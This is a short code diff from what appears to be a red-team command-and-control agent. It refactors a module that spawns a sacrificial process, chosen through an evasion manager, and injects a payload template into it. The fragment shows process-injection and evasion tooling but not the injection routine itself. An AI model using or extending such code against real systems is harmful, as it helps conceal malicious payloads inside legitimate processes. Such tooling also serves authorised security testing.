@@ -53,15 +53,11 @@ namespace Apollo.CommandModules
                 return;
             }
 
-            if (agent.architecture == "x64")
-                sacrificialApplication = EvasionManager.SpawnTo64;
-            else
-                sacrificialApplication = EvasionManager.SpawnTo86;
-
+            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
             try
             {
 
-                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, "", true);
+                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
 
                 if (sacrificialProcess.Start())
                 {
@@ -69,7 +65,7 @@ namespace Apollo.CommandModules
                     job.sacrificialProcess = sacrificialProcess;
                     if (sacrificialProcess.Inject(templateFile))
                     {
-                        job.SetComplete(string.Format("Spawned {0} (PID: {1}) and successfully injected the specified payload template.", sacrificialApplication, sacrificialProcess.PID));
+                        job.SetComplete(string.Format("Spawned {0} (PID: {1}) and successfully injected the specified payload template.", startupArgs.Application, sacrificialProcess.PID));
                     }
                     else
                     {
